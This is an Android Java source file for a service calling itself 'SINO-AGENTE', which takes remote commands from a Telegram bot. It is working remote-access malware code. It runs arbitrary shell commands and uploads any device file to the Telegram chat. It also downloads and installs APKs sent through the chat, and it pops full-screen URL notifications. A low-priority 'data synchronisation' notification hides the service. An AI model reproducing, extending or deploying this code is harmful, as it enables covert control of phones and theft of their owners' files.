package br.svc.relay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.util.Locale;

/**
 * SINO-AGENTE v2.2 — comando remoto via Telegram.
 * sh | status | open | ping | uninstall | install (APK pelo chat) | pull <arquivo>
 */
public class RelayService extends Service {

    private static final String CH = "sync_data_min";
    private static final int NOTIF_ID = 2002;

    private TelegramBridge tg;
    private long startedAt = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        startedAt = System.currentTimeMillis();
        goForeground();

        tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
        BridgeHolder.tg = tg;
        tg.say("agente online v" + BuildConfig.VERSION_NAME);

        new Thread(() -> tg.listen((text, from) ->
                new Thread(() -> onCmd(text), "relay-exec").start()), "relay-tg").start();
    }

    private void onCmd(String text) {
        String c = text.trim();
        String low = c.toLowerCase(Locale.ROOT);
        try {
            if (low.equals("ping")) { tg.say("pong"); return; }
            if (low.equals("status") || low.equals("estado")) { tg.say(statusLine()); return; }
            if (low.startsWith("open ")) { cmdOpen(c.substring(5).trim()); return; }
            if (low.equals("uninstall")) { cmdUninstall(); return; }
            if (low.equals("install") || low.equals("update")) {
                tg.say("manda o APK como ARQUIVO (documento) com a legenda '" + low + "'"); return; }
            if (low.startsWith("pull ")) { cmdPull(c.substring(5).trim()); return; }
            if (c.startsWith("DOC:")) { cmdDoc(c); return; }
            if (low.startsWith("sh ")) { tg.say(Exec.run(c.substring(3))); return; }
            if (low.startsWith("shell ")) { tg.say(Exec.run(c.substring(6))); return; }
            tg.say("comandos: sh <cmd> | status | open <url> | pull <arquivo> | uninstall | install (APK como doc) | ping");
        } catch (Throwable t) {
            tg.say("erro cmd: " + t);
        }
    }

    // ---------- comandos ----------

    private void cmdOpen(String url) {
        try {
            Intent view = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            view.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            int req = (int) (System.currentTimeMillis() % 2000000000L);
            PendingIntent pi = PendingIntent.getActivity(this, req, view,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            String chId = "open_fsi";
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new NotificationChannel(chId, "avisos do sistema",
                        NotificationManager.IMPORTANCE_HIGH));
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, chId)
                    : new Notification.Builder(this);
            b.setContentTitle("Sistema")
             .setContentText(url)
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setAutoCancel(true)
             .setContentIntent(pi)
             .setFullScreenIntent(pi, true);
            nm.notify(req, b.build());
            tg.say("abrindo (avisado na tela): " + url);
        } catch (Exception e) { tg.say("erro open: " + e); }
    }

    private void cmdUninstall() {
        try {
            Intent status = new Intent(InstallReceiver.ACTION).setPackage(getPackageName());
            status.putExtra("what", "uninstall");
            PendingIntent p = PendingIntent.getBroadcast(this, 991, status,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
            getPackageManager().getPackageInstaller().uninstall(getPackageName(), p.getIntentSender());
            tg.say("uninstall: sessao aberta (confirme na tela)");
        } catch (Exception e) {
            tg.say("erro uninstall: " + e);
        }
    }

    private void cmdPull(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) { tg.say("pull: nao existe: " + path); return; }
            if (!f.isFile()) { tg.say("pull: nao e arquivo: " + path); return; }
            long len = f.length();
            if (len > 45 * 1024 * 1024) { tg.say("pull: arquivo grande demais (" + len + " bytes, teto 45MB)"); return; }
            byte[] data = new byte[(int) len];
            try (FileInputStream fi = new FileInputStream(f)) {
                int lido = 0;
                while (lido < len) {
                    int n = fi.read(data, lido, (int) len - lido);
                    if (n < 0) break;
                    lido += n;
                }
            }
            tg.sendDocument(data, f.getName());
            tg.say("pull: enviado " + f.getName() + " (" + len + " bytes)");
        } catch (Exception e) { tg.say("erro pull: " + e); }
    }

    private void cmdDoc(String c) {
        // DOC:<cap>:<file_id>:<file_name>
        String[] partes = c.split(":", 4);
        if (partes.length < 4) { tg.say("doc invalido"); return; }
        String cap = partes[1].trim().toLowerCase(Locale.ROOT);
        String fid = partes[2];
        String nome = partes[3];
        if (!cap.equals("install") && !cap.equals("update")) {
            tg.say("doc recebido: " + nome + " — use a legenda 'install' pra instalar"); return;
        }
        if (!nome.toLowerCase(Locale.ROOT).endsWith(".apk")) {
            tg.say("so instalo .apk (recebido: " + nome + ")"); return; }
        try {
            tg.say("baixando " + nome + "...");
            byte[] apk = tg.downloadFile(fid);
            tg.say("instalando " + nome + " (" + apk.length + " bytes)...");
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams sp =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sid = installer.createSession(sp);
            PackageInstaller.Session s = installer.openSession(sid);
            try (OutputStream os = s.openWrite("pkg", 0, apk.length)) {
                os.write(apk);
                s.fsync(os);
            }
            Intent status = new Intent(InstallReceiver.ACTION).setPackage(getPackageName());
            status.putExtra("what", cap);
            PendingIntent p = PendingIntent.getBroadcast(this, sid, status,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
            s.commit(p.getIntentSender());
        } catch (Exception e) {
            tg.say("erro install: " + e);
        }
    }

    private String statusLine() {
        IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent bi;
        if (Build.VERSION.SDK_INT >= 33)
            bi = registerReceiver(null, f, Context.RECEIVER_NOT_EXPORTED);
        else
            bi = registerReceiver(null, f);
        int bat = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
        return String.format(Locale.US, "bateria %d%% · uptime %dmin · transporte telegram · posto %s",
                bat, upMin, BuildConfig.VERSION_NAME);
    }

    private void goForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(new NotificationChannel(CH, "sincronizacao de dados",
                    NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, CH)
                : new Notification.Builder(this);
        b.setContentTitle("Sincronização de Dados")
         .setContentText("Sincronizando…")
         .setSmallIcon(android.R.drawable.stat_notify_sync)
         .setOngoing(false).setShowWhen(false);
        if (Build.VERSION.SDK_INT >= 31) b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        startForeground(NOTIF_ID, b.build());
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
